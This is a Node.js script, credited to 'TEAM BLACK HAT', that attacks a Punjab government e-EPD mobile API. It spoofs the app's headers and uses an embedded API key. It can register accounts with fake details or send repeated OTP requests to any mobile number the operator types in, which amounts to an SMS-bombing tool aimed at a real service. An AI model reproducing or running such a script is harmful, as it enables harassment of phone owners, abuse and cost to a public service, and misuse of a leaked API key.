const axios = require('axios');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// API Base URL
const base_url = "https://e-epd.punjab.gov.pk";

// Common Headers
const headers = {
  'app': 'sans',
  'version': '28',
  'Content-Type': 'application/json; charset=UTF-8',
  'Host': 'e-epd.punjab.gov.pk',
  'Connection': 'Keep-Alive',
  'Accept-Encoding': 'gzip',
  'User-Agent': 'okhttp/4.5.0'
};

async function main() {
  console.log("Choose an option:");
  console.log("1) Register New User");
  console.log("2) Regenerate OTP Multiple Times");
  
  const choice = await question("Enter choice [1 or 2]: ");

  if (choice === "1") {
    await registerUser();
  } else if (choice === "2") {
    await regenerateOTP();
  } else {
    console.log("Invalid choice. Exiting.");
    process.exit(0);
  }
}

async function registerUser() {
  const mobile_number = await question("Enter Mobile Number: ");
  
  const data = {
    "cnic": "",
    "email": "",
    "name": "Ali khan",
    "mobile_number": mobile_number,
    "password": "Abcd1234$@.",
    "user_type": "3",
    "apiKey": "cs3pqO4xW6zFsRH5kaLomFPJHsHdQrWe",
    "imei": "123",
    "latitude": "0.0",
    "longitude": "0.0",
    "versionCode": "3"
  };

  try {
    const response = await axios.post(`${base_url}/api/register`, data, { headers });
    console.log("Response:", response.data);
  } catch (error) {
    console.error("Error:", error.response ? error.response.data : error.message);
  }
}

async function regenerateOTP() {
  const mobile_number = await question("Enter Mobile Number: ");
  const otp_count = parseInt(await question("How many times to send OTP? "));

  for (let i = 1; i <= otp_count; i++) {
    console.log(`Sending OTP #${i}`);
    
    try {
      const response = await axios.post(`${base_url}/api/sns_generate_mobile_otp`, {
        "mobile_number": mobile_number
      }, { headers });
      
      console.log("Response:", response.data);
    } catch (error) {
      console.error("Error:", error.response ? error.response.data : error.message);
    }

    console.log("----------------------------------------");
    console.log("Developer: TEAM BLACK HAT");
    console.log("----------------------------------------");
    console.log("Credit RealCyropes");
    
    if (i < otp_count) {
      await sleep(1000); // 1 second delay
    }
  }
}

function question(prompt) {
  return new Promise((resolve) => {
    rl.question(prompt, resolve);
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

main().catch(console.error);
